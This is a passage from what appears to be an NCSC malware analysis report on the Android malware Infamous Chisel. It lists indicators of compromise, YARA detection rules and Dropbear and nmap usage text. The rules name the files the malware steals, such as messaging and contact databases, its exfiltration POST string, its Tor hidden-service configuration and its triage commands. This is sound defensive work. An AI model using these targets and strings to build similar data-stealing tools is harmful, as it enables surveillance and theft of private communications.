list \nentry NDBR_armv7l  \nNDBR_i\n686 \nPaths  Binary path /data/local/NDBR_i686  \nNDBR_i\n686 \nProcess \nListing \nName  Proces s list \nentry NDBR_i686  \n \nIndicators of compromise  suspicious in the context of an Android device  \nType  Description  Values  \ntd \nProcess \nListing \nName  Process list \nentry td \ntd \nLocal \nPort Port open socks 127.0.0[.]1:1129 \ntd \nLocal \nPort Port open \nhidden service  127.0.0[.]1:34371  \ntcpdum\np Paths Binary path /data/local/tcpdump  \n\n \n Type  Description  Values  \ntcpdum\np \nProcess \nListing \nName Process list \nentry tcpdump \nblob  \nDomain Domain \ncommunication  www.geodatatool [.]com \ndb IP \nTables IP tables  Port 34371 Present  \n \n  \n\n \n Rules and signatures  \nDescriptio n Unique paths created by netd  \nPrecision  High Confidence   no hits in VirusTotal  \nRule type  YARA \nrule netd_CreatedFiles  { \n  meta: \n    author = \"NCSC\"  \n    description = \" Unique file paths created by netd \" \n    date = \" 2023-08-31\" \n  strings:  \n    $ = \"/data/ local/tmp/.aid.cache\"  \n    $ = \"/data/local/tmp/.syscache.csv\"  \n    $ = \"/data/local/tmp/.syspackages.csv\"  \n    $ = \"/data/local/tmp/.sysin fo.csv\" \n    $ = \"/data/local/tmp/.ndata.csv\"  \n    $ = \"/data/local/tmp/.ndata.tmp\"  \n    $ = \"/data/local/tmp/.android.cach e.sh\" \n  condition:  \n    uint32(0) == 0x464C457F and any of them  \n} \n \nDescription  Application directories strings searched by netd  \nPrecision  High Confidence   no hits in VirusTotal  \nRule type  YARA  \nrule netd_ScrapedApps  { \n  meta: \n    author = \"NCSC\"  \n    description = \" Application directories strings searched by netd \" \n    date = \" 2023-08-31\" \n  strings:  \n    $ = \"/data/data/com.android.providers.contacts\"  \n    $ = \"/data/data/com.android.providers.telephony\"  \n    $ = \"/data/data/com.google.android.gm\"  \n    $ = \"/da ta/data/de.blinkt.openvpn\"  \n    $ = \"/data/data/eu.thedarken.wldonate\"  \n    $ = \"/data/data/net.openvpn.openvpn\"  \n    $ = \"/data/data/org.telegram.messenger\"  \n    $ = \"/data/data/org.thoughtcrime.securesms\"  \n  condition:  \n    uint32(0) == 0x464C457F and all of t hem \n} \n \n  \n\n \n Description  POST request strings present in netd  \nPrecision  High Confidence   no hits in VirusTotal  \nRule type  YARA  \nrule netd_Uri {  \n  meta: \n    author = \"NCSC\"  \n    description = \"POST request strings present in netd\"  \n    date = \" 2023-08-31\" \n  strings: \n    $ = \"POST /server.php?ver=16&bid=%s&type=%d\"  \n    $ = \"User -Agent: curl/7.47\"  \n  condition:  \n    uint32(0) == 0x464C457F and all of them  \n} \n \nDescription  db and td path strings found in netd  \nPrecision  High Confidence   no hits in VirusTotal  \nRule t ype YARA  \nrule netd_Paths { \n  meta: \n    author = \"NCSC\"  \n    description = \"db and td path strings found in netd\"  \n    date = \" 2023-08-31\" \n  strings:  \n    $ = \"/data/local/db\"  \n    $ = \"/data/local/prx.cfg\"  \n    $ = \"/data/local/td\"  \n  condition:  \n    uint32(0) = = 0x464C457F and all of them  \n} \n \n  \n\n \n  \nDescription  File extension list string found in netd  \nPrecision  High Confidence   no hits in VirusTotal  \nRule type  YARA  \nrule netd_FileExtensionString  { \n  meta: \n    author = \"NCSC\"  \n    description = \" File extension list string found in netd \" \n    date = \" 2023-08-31\" \n strings:  \n  $ = \n\".dat,.bak,.xml,.txt,.ovpn,.xml,wa.db,msgstore.db,.pdf,.xlsx,.csv,.zip,te\nlephony.db,.png,.jpg,.jpeg,.kme,database.hik,database.hik -\njournal,ezvizlog.db,cache4.db,contacts2.db, .docx,.gz,.rar,.tar, .7zip,.zip\n,.kmz,locksettings.db,mmssms.db,telephony.db,signal.db,mmssms.db,profile.\ndb,accounts.db,PyroMsg.DB,.exe,.kml\"  \n condition:  \n  uint32(0) == 0x464C457F and any of them  \n} \n \nDescription  blob path string found in netd  \nPrecision  High Confidence   no hit s in VirusTotal  \nRule type  YARA  \nrule netd_Blob { \n  meta: \n    author = \"NCSC\"  \n    description = \" blob path string found in netd \" \n    date = \" 2023-08-31\" \n  strings:  \n    $ = \"/data/local/tmp/blob\"  \n  condition:  \n    uint32(0) == 0x464C457F and any of them  \n} \n \n  \n\n \n Description  Tor hostname path string found in netd  \nPrecision  High Confidence   no hits in VirusTotal  \nRule type  YARA  \nrule netd_TorDomainPath  { \n  meta: \n    author = \"NCSC\"  \n    description = \"Tor hostname path string found in netd\"  \n    date = \" 2023-08-31\" \n  strings:  \n    $ = \"/data/local/prx/hs/hostname\"  \n  condition:  \n    uint32(0) == 0x464C457F and any of them   \n} \n \nDescription  Shell script commands found in netd  \nPrecision  High Confidence   no hits in VirusTotal  \nRule type  YARA  \nrule netd_TriageCommands  { \n  meta: \n    author = \"NCSC\"  \n    description = \"Shell script commands found in netd\"  \n    date = \" 2023-08-31\" \n  strings:  \n    $ = \"settings get secure android_id\"  \n    $ = \"pm list packages\"  \n    $ = \"getprop\"  \n  condition:  \n    uint32(0) == 0x464C457F and all of  them \n} \n \nDescription  netd  wait loop  \nPrecision  High Confidence   no hits in VirusTotal  \nRule type  YARA  \nrule netd_waitloop  { \n  meta: \n    author = \"NCSC\"  \n    description = \"netd wait loop\"  \n    date = \" 2023-08-31\" \n  strings: \n    $ = {38 23 F9 18 01 23 5B 42  01 22 18 00 ?? ?? ?? ?? 0F 20}  \n  condition:  \n    uint32(0) == 0x464C457F and any of them  \n} \n \n\n \n Description  netd  pid for loop  \nPrecision  High Confidence   no hits in VirusTotal  \nRule type  YARA  \nrule netd_pidloop  { \n  meta: \n    author = \"NCSC\"  \n    description =  \"netd pid for loop\"  \n    date = \" 2023-08-31\" \n  strings:  \n    $ = {1B 68 8A 4A 93 42 ?? ?? ?? ?? C0 46}  \n  condition:  \n    uint32(0) == 0x464C457F and any of them  \n} \n \n \nDescription  Tor configuration file strings in blob  \nPrecision  High Confidence   no hits in V irusTotal  \nRule type  YARA  \nrule blob_TorCommandLine  { \n  meta: \n    author = \"NCSC\"  \n    description = \"T or configuration file strings in blob\" \n    date = \" 2023-08-31\" \n    hash1 = \"b681a2b64d150a4b16f64455913fbacd97d9b490\"  \n  strings:  \n    $ = \"SocksPort 127.0.0.1:1129\"  \n    $ = \"DataDirectory /data/local/prx/\"  \n    $ = \"/data/local/prx/hs/\"  \n    $ = \"HiddenServicePort 34371 127.0.0.1:34371\"  \n  condition:  \n    uint32(0) == 0x464C457F and 2 of them \n} \n \n  \n\n \n  \nDescription  blob  wait on event loop  \nPrecision  High Confidence   no hits in VirusTotal  \nRule type  YARA  \nrule blob_waitloop  { \n  meta: \n    author = \"NCSC\"  \n    description = \" blob wait on event loop\"  \n    date = \" 2023-08-31\" \n    hash1 = \"b681a2b64d150a4b16f64455913fbacd97d9b490\"  \n  strings:  \n    $ = {0C 23 F9 18 01 23 5B 42  01 22 18 00 ?? ?? ?? ?? 03 1E}  \n  condition:  \n    uint32(0) == 0x464C457F and any of them  \n} \n \n \nDescription  killer  binary  strings  \nPrecision  High Confidence  no hits in VirusTotal  \nRule type  YARA  \nrule killer_Strings { \n  meta: \n    author = \"NCSC\"  \n    description = \" killer binary strings\"  \n    date = \" 2023-08-31\" \n    hash1 = \"ad6eb2a7096b0e29cd93b8b1f60052fed7632ab9\"  \n  strings:  \n    $ = \"netd_\" \n    $ = \"/proc/%d/exe\"  \n    $ = \"/proc/%d/status\"  \n  condition:  \n    uint32(0) == 0x464C457F and uint8(4) == 0x1 and uint 16(18) == 0x0028 \nand all of them  \n} \n \n  \n\n \n Description  db Android path strings  \nPrecision  High Confidence  no hits in VirusTotal  \nRule type  YARA  \nrule db_androidpaths  { \n  meta: \n    author = \"NCSC\"  \n    description = \" db Android path strings \" \n    date = \" 2023-08-31\" \n    hash1 = \"ffaeba9a9fb4260b981fb10d79dbb52ba291fc94\"  \n  strings:  \n    $ = \"/data/local/tmp/sessions.log.d/.ssh/remove_file.flag\"  \n    $ = \"/data/local/tmp/sessions.log.d\"  \n    $ = \"/data/local/tmp/sessions.log.d/.ssh\"  \n    $ = \"/data/local/tmp/ sessions. log.d/.ssh/authorized_keys\"  \n    $ = \"/data/local/tmp/sessions.log.d/.ssh/know_host\"  \n    $ = \"/data/local/tmp/sessions.log.d/dropbear_rsa_host_key\"  \n    $ = \"/data/local/tmp/sessions.log.d/dropbear_dss_host_key\"  \n    $ = \"/data/local/tmp/sessions.log .d/dropbe ar_ecdsa_host_key\"  \n    $ = \"/data/local/tmp/sessions.log.d/session.key\"  \n    $ = \"/data/local/tmp/sessions.log.d/.bash_history\"  \n    $ = \"/data/local/tmp/sessions.log.d/dropbear_ed25519_host_key\"  \n    $ = \"/data/local/tmp/sessions.log.d/\"  \n    $ = \"/data/local /tmp/sessions.log.d\"  \n  condition:  \n    uint32(0) == 0x464C457F and uint8(4) == 0x1 and uint16(18) == 0x0028 \nand all of them  \n} \n \n  \n\n \n Description  ndbr  scan strings  \nPrecision  High Confidence  no hits in VirusTotal  \nRule type  YARA  \nrule ndbr_ScanStrings  { \n  meta: \n    author = \"NCSC\"  \n    description = \" ndbr scan strings \" \n    date = \" 2023-08-31\" \n    hash1 = \"917db380b22fad02e7f21f11d1b4e8a5ad47c61c\"  \n    hash2 = \"7d11aefc26823712ad8de37489f920fae679b845\"  \n  strings:  \n    $ = \"INTERFACE = %s\"  \n    $ = \"SOURCE = %s\"  \n    $ = \"IP begin = %s\"  \n    $ = \"IP end = %s\"  \n    $ = \"PORT = top\"  \n    $ = \"PORT begin = %hu\"  \n    $ = \"PORT end = %hu\"  \n    $ = \"PING %s\"  \n    $ = \"SCAN %s\"  \n    $ = \"*******start*scan********\"  \n    $ = \"Host %s:\"  \n  condition:  \n    uint32(0) == 0x464C457F and uint 8(4) == 0x1 and uint16(18) == 0x0028 \nand all of them  \n} \n \n  \n\n \n Appendix  \nDropbear unmodified fill_passwd function  \nvoid fill_passwd (const char* username ) { \n struct passwd *pw = NULL; \n if (ses.authstate .pw_name) \n  m_free(ses.authstate .pw_name); \n if (ses.authstate .pw_dir) \n  m_free(ses.authstate .pw_dir); \n if (ses.authstate .pw_shell ) \n  m_free(ses.authstate .pw_shell ); \n if (ses.authstate .pw_passwd ) \n  m_free(ses.authstate .pw_passwd ); \n \n pw = getpwnam (username ); \n if (!pw) { \n  return; \n } \n ses.authstate .pw_uid = pw->pw_uid; \n ses.authstate .pw_gid = pw->pw_gid; \n ses.authstate .pw_name = m_strdup (pw->pw_name); \n ses.authstate .pw_dir = m_strdup (pw->pw_dir); \n ses.authstate .pw_shell = m_strdup (pw->pw_shell ); \n { \n  char *passwd_crypt = pw->pw_passwd ; \n#ifdef HAVE_SHADOW_H  \n  /* get the shadow password if possible */  \n  struct spwd *spasswd = getspnam (ses.authstate .pw_name); \n  if (spasswd && spasswd->sp_pwdp) { \n   passwd_crypt = spasswd->sp_pwdp; \n  } \n#endif \n  if (!passwd_crypt) { \n   /* android supposedly returns NULL */  \n   passwd_crypt = \"!!\"; \n  } \n  ses.authstate .pw_passwd = m_strdup (passwd_crypt ); \n } \n} \n \n  \n\n \n Dropbear  unmodified  login_init_entry  function  \n/* login_init_entry(struct logininfo  *, int, char*, char*, char*)  \n *                                        - initialise a struct logininfo  \n * \n * Populates a new struct logininfo, a data structure meant to carry  \n * the information required to portably record login info.  \n * \n * Returns: 1  \n */ \nint \nlogin_init_entry (struct logininfo *li, int pid, const char *username , \n   const char *hostname , const char *line) \n{ \n struct passwd *pw; \n \n memset(li, 0, sizeof(*li)); \n \n li->pid = pid; \n \n /* set the line information */  \n if (line) \n  line_fullname (li->line, line, sizeof(li->line)); \n \n if (username ) { \n  strlcpy(li->username , username , sizeof(li->username )); \n  pw = getpwnam (li->username ); \n  if (pw == NULL) \n   dropbear_exit (\"login_init_entry: Cannot find user \n\\\"%s\\\"\", \n     li->username ); \n  li->uid = pw->pw_uid; \n } \n \n if (hostname ) \n  strlcpy(li->hostname , hostname , sizeof(li->hostname )); \n \n return 1; \n  \n\n \n Dropbear  unmod ified  sessionpty  function  \n/* Set up a session pty which will be used to execute the shell or \nprogram.  \n * The pty is allocated now, and kept for when the shell/program \nexecutes.  \n * Returns DROPBEAR_SUCCESS or DROPBEAR_FAILURE */  \nstatic int sessionpty (struct ChanSess * chansess ) { \n \n unsigned  int termlen; \n char namebuf[65]; \n struct passwd * pw = NULL; \n \n TRACE((\"enter sessionpty\" )) \n \n if (!svr_pubkey_allows_pty ()) { \n  TRACE((\"leave sessionpty : pty forbidden by public key \noption\")) \n  return DROPBEAR_FAILURE ; \n } \n \n chansess ->term = buf_getstring (ses.payload, &termlen); \n if (termlen > MAX_TERM_LEN ) { \n  /* TODO send disconnect ? */  \n  TRACE((\"leave sessionpty: term len too long\" )) \n  return DROPBEAR_FAILURE ; \n } \n \n /* allocate the pty */  \n if (chansess ->master != -1) { \n  dropbear_exit (\"Multiple pty requests\" ); \n } \n if (pty_allocate (&chansess ->master, &chansess ->slave, namebuf, 64) \n== 0) { \n  TRACE((\"leave sessionpty: failed to allocate pty\" )) \n  return DROPBEAR_FAILURE ; \n } \n  \n chansess ->tty = m_strdup (namebuf); \n if (!chansess ->tty) { \n  dropbear_exit (\"Out of memory\" ); /* TODO disconnect */  \n } \n \n pw = getpwnam (ses.authstate .pw_name); \n if (!pw) \n  dropbear_exit (\"getpwnam failed after succeeding previously\" ); \n pty_setowner (pw, chansess ->tty); \n \n /* Set up the rows/col counts */  \n sessionwinchange (chansess ); \n \n /* Read the terminal modes */  \n get_termmodes (chansess ); \n \n TRACE((\"leave sessionpty\" )) \n return DROPBEAR_SUCCESS ; \n} \n \n\n \n Nmap  command line options  \nUsage nmap -ip* <ip-addr: 192.168.0.1/ip -range: 192.168.0.0/24> -p* \n<port: 80/port-range: 25-125/top> -udp <default tcp> -noping <default \nyes> -o <out_file> -t <timeout> < -n> <-h/--help (print this help)  \n \nDropbear client [dbclient|ssh]  command line options  \nDropbear  SSH client v2020.81 \nhttps://matt.ucc.asn.au/dropbear/dropbear.html  \nUsage: dbcl ient [options] [user@]host[/port][,[user@]host/port],...] \n[command]  \n-p <remoteport>  \n-l <username>  \n-t    Allocate a pty  \n-T    Don't allocate a pty  \n-N    Don't run a remote comman d \n-f    Run in background after auth  \n-y    Always accept remote host key if unk nown \n-y -y Don't perform any remote host key checking (caution)  \n-s    Request a subsystem (use by external sftp)  \n-o option     Set option in OpenSSH -like format (' -o help' to li st \noptions)  \n-i <identityfile>   (multiple allowed, default .ssh/id_dropbear)  \n-A    Enable agent auth forwarding  \n-L <[listenaddress:]listenport:remotehost:remoteport> Local port \nforwarding  \n-g    Allow remote hosts to connect to forwarded ports  \n-R <[listenad dress:]listenport:remotehost:remoteport> Remote port \nforwarding  \n-W <receive_win dow_buffer> (default 24576, larger may be faster, max 1MB)  \n-K <keepalive>  (0 is never, default 30)  \n-I <idle_timeout>  (0 is never, default 1800)  \n-B <endhost:endport> Netcat -alike forwarding  \n-J <proxy_program> Use program pipe rather than TCP connection  \n-c <cipher list> Specify preferred ciphers (' -c help' to list options)  \n-m <MAC list> Specify preferred MACs for packet verification (or ' -m \nhelp') \n-b    [bind_address][:bind_port]  \n-V    Version  \nscp \nusage: scp [ -1246BCpqrv] [ -c cipher] [ -F ssh_config] [ -i identity_file]  \n           [-l limit] [ -P port] [ -S program]  \n           [[user@]host1:]file1 [...] [[user@]host2:]file2  \n \nDropbearkey  command line options  \nMust specify a key filename  \nUsage: dropbearkey -t <type> -f <filename> [ -s bits] \n-t type Type of key to g enerate. One of:  \n  rsa \n  dss \n  ecdsa \n  ed25519 \n-f filename    Use filename for the secret key.  \n               ~/.ssh/id_dropbear  is recommended for client keys.  \n-s bits Key size in bits, should be a multiple of 8 (optional)  \n           DSS has a fixed size of 1024 bits  \n           ECDSA has sizes 256 384 521  \n           Ed25519 has a fixed size of 256 bits  \n-y  Just print the publicke y and fingerprint for the  \n  private key in <filename>.  \n\n \n  \nDropbear  server  command line options  \nDropbear server v2020.81 https://m att.ucc.asn.au/dropbear/dropbear.html  \nUsage: dropbear [options]  \n-b bannerfile  Display the contents of bannerfile before user log in \n  (default: none)  \n-r keyfile      Specify hostkeys (repeatable)  \n  defaults:  \n  - dss /tmp/sessions.log.d/dropbear_dss_host_ke y \n  - rsa /tmp/sessions.log.d/dropbear_rsa_host_key  \n  - ecdsa /tmp/sessions.log.d/dropbear_ecdsa_host_key  \n  - ed25519 /tmp/sessi ons.log.d/dropbear_ed25519_host_key  \n-R  Create hostkeys as required  \n-F  Don't fork into background  \n(Syslog support not compiled in, using stderr)  \n-w  Disallow root logins  \n-G  Restrict logins to members of specified group  \n-s  Disable password logins  \n-g  Disable password logins for root  \n-B  Allow blank password logins  \n-T  Maximum authentication tries (default 10)  \n-j  Disable local po rt forwarding  \n-k  Disable remote port forwarding  \n-a  Allow connections to forwarded ports from any host  \n-c command  Force exec uted command  \n-p [address:]port  \n  Listen on specified tcp port (and optionally address),  \n  up to 10 can be specified  \n  (default port  is 2222 if none specified)  \n-P PidFile  Create pid file PidFile  \n  (default /var/run/sessionlog.pid)  \n-i  Start for i netd \n-W <receive_window_buffer> (default 24576, larger may be faster, max 1MB)  \n-K <keepalive>  (0 is never, default 30, in seconds)  \n-I <idle_t imeout>  (0 is never, default 1800, in seconds)  \n-V    Version  \n \n  \n\n \n Disclaimer  \nThis report draws on information derived from NCSC and industry sources. Any NCSC findings \nand recommendations made have not been provided with the intention of avoiding all risk s and \nfollowing the recommendations will not remove all such risk. Ownership o f information risks \nremains with the relevant system owner at all times.  \nThis information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt \nunder other  UK information legislation.  \nRefer any FOIA queries to ncscinfoleg@ncsc.gov.uk .  \nAll material is UK Crown Copyright   \n \n \n\n",
  "cves": [],
  "techniques": [
    "T1114.001",
    "T1074.001"
  ],
  "advisory": "cybersecurity-alerts",
  "title": "infamous_chisel_20230831",
  "source": "nsa",
  "id": "20b53db6af50bf3d0da440f1f8b6ae3becb3aa5b88c4092859062f045bf64f82"
}